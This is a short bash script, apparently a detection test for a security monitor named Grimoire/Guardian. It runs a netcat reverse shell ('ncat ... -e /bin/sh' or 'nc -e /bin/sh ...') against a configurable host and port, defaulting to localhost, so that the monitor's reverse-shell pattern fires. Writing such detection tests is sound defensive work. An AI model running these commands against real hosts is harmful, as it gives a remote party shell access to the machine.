#!/bin/bash
# Attack: Netcat reverse shell using real syscalls
# Purpose: Execute reverse shell for Grimoire detection testing
# Expected: Guardian should detect socket()->dup2()->dup2()->execve() pattern

TARGET_IP="${1:-127.0.0.1}"
TARGET_PORT="${2:-4444}"

echo "🔥 Executing netcat reverse shell attack..."
echo "   Target: $TARGET_IP:$TARGET_PORT"
echo "   (This should trigger Grimoire pattern: reverse_shell_classic)"
echo ""

if command -v ncat &> /dev/null; then
    ncat "$TARGET_IP" "$TARGET_PORT" -e /bin/sh
elif command -v nc &> /dev/null; then
    nc -e /bin/sh "$TARGET_IP" "$TARGET_PORT"
else
    echo "❌ No netcat variant found (ncat/nc)"
    exit 1
fi
